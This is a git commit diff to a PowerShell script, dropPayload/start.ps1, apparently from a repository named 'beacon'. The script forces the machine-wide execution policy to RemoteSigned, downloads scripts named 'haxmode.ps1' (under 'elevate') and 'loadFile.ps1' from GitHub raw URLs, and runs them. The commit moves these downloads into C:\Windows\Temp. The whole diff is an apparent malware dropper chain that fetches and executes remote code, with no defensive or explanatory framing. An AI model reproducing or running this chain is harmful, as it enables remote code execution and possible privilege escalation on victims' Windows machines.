e2576645f786a75d9572ec3fb0c261edf8400f90
currone <94299594+snackmasta@users.noreply.github.com>
2024-02-09 06:45:14 +0700

    pdf xixixi

--- dropPayload/start.ps1
+++ dropPayload/start.ps1
@@ -1,5 +1,5 @@
 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force;  
-Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > $pwd/mode.ps1;  
-./mode.ps1;
-Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > $pwd/start.ps1;  
-./start.ps1
+Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\Windows\Temp\mode.ps1;  
+C:\Windows\Temp\mode.ps1;
+Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > C:\Windows\Temp\start.ps1;  
+C:\Windows\Temp\start.ps1
